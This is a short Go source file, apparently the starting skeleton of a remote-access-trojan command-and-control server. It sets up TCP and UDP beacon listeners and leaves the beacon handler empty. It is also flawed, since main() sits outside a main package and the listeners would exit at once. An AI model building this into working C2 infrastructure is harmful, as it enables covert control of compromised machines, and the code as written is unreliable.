/******************************************************************************
 This is a Remote Administration Tool, Command And Control Binary
	This file contains the code necessary for the creation of a
	Command and control infrastructure consisting of a single
	point of failure.


=================================================================
/*/

package command_binary

import (
	rat_shared_code "go_rat/pkg/Rat_shared_code"

	"net"
)

// function to handle connection attempts from hosts sending beacons
func handle_beacon(network_connection net.Conn) {

}

func start_tcp() net.TCPListener {
	TCPserver, derp := net.ListenTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN)

	if derp != nil {
		rat_shared_code.Error_printer(derp, "[-] TCP Beacon Listener failed to start")
	}
	return *TCPserver

}
func start_udp() net.UDPConn {
	UDPserver, derp := net.ListenUDP("udp", &rat_shared_code.Local_udpaddr_LAN)
	if derp != nil {
		rat_shared_code.Error_printer(derp, "[-] UDP Beacon Listener failed to start")
	}
	return *UDPserver
}

func main() {
	go start_tcp()
	go start_udp()
}
